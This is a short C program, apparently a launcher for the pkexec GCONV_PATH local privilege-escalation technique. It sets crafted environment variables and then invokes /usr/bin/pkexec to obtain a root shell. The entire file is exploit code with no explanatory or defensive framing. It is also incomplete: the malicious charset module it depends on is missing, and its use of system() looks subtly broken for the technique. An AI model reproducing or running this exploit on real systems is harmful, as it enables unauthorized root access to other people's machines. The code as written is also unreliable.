#include <stdlib.h>
int main() {
    putenv("PATH=GCONV_PATH=.");
    putenv("CHARSET=LOL");
    putenv("SHELL=/bin/sh");
    system("/usr/bin/pkexec");
    return 0;
}
